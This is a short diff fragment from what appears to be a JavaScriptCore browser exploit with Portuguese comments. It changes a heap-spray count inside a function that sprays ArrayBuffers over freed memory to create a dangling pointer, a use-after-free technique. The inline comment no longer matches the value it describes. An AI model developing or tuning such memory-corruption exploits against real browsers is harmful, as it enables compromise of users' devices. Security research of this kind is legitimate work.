@@ -308,7 +308,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, 
     // PASSO 3.2: Pulverizar sobre a memória liberada com ArrayBuffer contendo o ponteiro desejado.
     logFn("--- FASE 4: Pulverizando AGRESSIVAMENTE APENAS ArrayBuffer sobre a memória liberada ---", "subtest");
     const spray_arrays = [];
-    const SPRAY_COUNT_UAF_NEW = 10000; // Aumentado para 25.000 (muito agressivo)
+    const SPRAY_COUNT_UAF_NEW = 5000; // Aumentado para 25.000 (muito agressivo)
     const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // Manter o mesmo tamanho
 
     // --- Determinar o ponteiro a ser pulverizado (com tag JSValue) ---
